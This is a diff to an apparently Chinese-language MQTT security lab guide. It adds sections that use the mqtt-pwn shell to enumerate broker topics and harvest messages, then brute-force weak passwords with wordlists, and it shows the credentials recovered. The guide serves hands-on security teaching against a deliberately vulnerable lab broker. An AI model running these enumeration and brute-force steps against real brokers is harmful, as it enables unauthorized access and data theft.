@@ -106,6 +106,47 @@ mosquitto_sub -h 192.168.2.127 -p 1883 -t '$SYS/#' -v -W 3 | head
 
 这里没有登录，也没有 ACL，`#` 一把梭。现实里很多“只给内网用”的 broker 就长这样：内网不等于安全。
 
+### 2.1 用 mqtt-pwn 做主题枚举（必做）
+
+手搓 `mosquitto_sub` 够验证，正式演示建议上 **mqtt-pwn**（Akamai 的 MQTT 渗透交互壳）：能连 broker、`discovery` 订阅 `#` / `$SYS/#` 采主题、落库、打标签（Sonoff / OwnTracks 等），后面还能爆破。
+
+本环境已在 `/tmp/mqtt-pwn` 备好（Postgres 在 docker `5431`）。启动：
+
+```sh
+bash /tmp/mqtt-pwn/run_mqtt_pwn.sh
+```
+
+进壳后（漏洞态 `01-insecure`）：
+
+```text
+>> connect -o 192.168.2.127 -p 1883
+>> system_info
+>> discovery -t 8 -p # $SYS/#
+>> scans
+>> topics
+>> messages
+```
+
+`discovery` 会扫一段时间；结束后 `topics` / `messages` 能列出采到的主题和内容。本靶场实测能看到类似：
+
+```text
+sonoff/switch1/info     ... password / supersecret   （自动打 sonoff 标签）
+owntracks/alice/phone   ... lat/lon                  （OwnTracks 标签）
+factory/secret/token    tok_...
+home/device1/status     ...
+```
+
+![mqtt-pwn discovery 枚举主题与消息](shots/14-mqtt-pwn-discovery.png)
+
+一条龙脚本（非交互，方便复现）：
+
+```sh
+# 漏洞态
+sudo bash lab/scripts/switch-profile.sh 01-insecure
+bash lab/scripts/seed-retained.sh
+bash lab/scripts/demo-mqtt-pwn.sh lab/wordlists/usernames.txt lab/wordlists/passwords.txt discovery
+```
+
 ---
 
 ## 三、用户名密码认证（对照）
@@ -146,7 +187,43 @@ mosquitto_sub -h 192.168.2.127 -p 1883 -u lab -P lab -t '#' -v -W 2
 mosquitto_sub -h 192.168.2.127 -p 1883 -u lab -P wrong -t '#' -W 2
 ```
 
-### 3.2 弱口令说明什么
+### 3.2 用 mqtt-pwn 爆破弱口令（必做）
+
+关匿名只是第一道门。口令烂的话，用 mqtt-pwn 的 `bruteforce` 几下就能撞开。  
+先保持 `02-auth-weak`，字典用仓库里的 `lab/wordlists/`：
+
+```sh
+bash /tmp/mqtt-pwn/run_mqtt_pwn.sh
+```
+
+```text
+>> connect -o 192.168.2.127 -p 1883 -u lab -w lab
+>> bruteforce --host 192.168.2.127 \
+     -uf lab/wordlists/usernames.txt \
+     -pf lab/wordlists/passwords.txt
+```
+
+本靶场实测会打出：
+
+```text
+[+] Found valid credentials: lab:lab
+[+] Found valid credentials: admin:admin
+[+] Found valid credentials: test:test
+[+] Found valid credentials: user:password
+[+] Found valid credentials: mqtt:mqtt
+...
+```
+
+![mqtt-pwn bruteforce 打出弱口令](shots/15-mqtt-pwn-brute.png)
+
+非交互：
+
+```sh
+sudo bash lab/scripts/switch-profile.sh 02-auth-weak
+bash lab/scripts/demo-mqtt-pwn.sh lab/wordlists/usernames.txt lab/wordlists/passwords.txt brute
+```
+
+### 3.3 弱口令说明什么
 
 `02-auth-weak` 只解决了“完全不认人”，没解决“口令太烂”和“登录后权限过大”。  
 口令文件在 `/etc/mosquitto/lab/passwd`，明文清单在 `lab/passwd/accounts.txt`。  
@@ -499,6 +576,11 @@ bash lab/scripts/seed-retained.sh
 # 状态
 bash lab/scripts/lab-status.sh
 cat /etc/mosquitto/lab/ACTIVE_PROFILE
+
+# mqtt-pwn
+bash /tmp/mqtt-pwn/run_mqtt_pwn.sh
+bash lab/scripts/demo-mqtt-pwn.sh lab/wordlists/usernames.txt lab/wordlists/passwords.txt discovery
+bash lab/scripts/demo-mqtt-pwn.sh lab/wordlists/usernames.txt lab/wordlists/passwords.txt brute
 
 # 切换 / 种数据
 sudo bash lab/scripts/switch-profile.sh 01-insecure
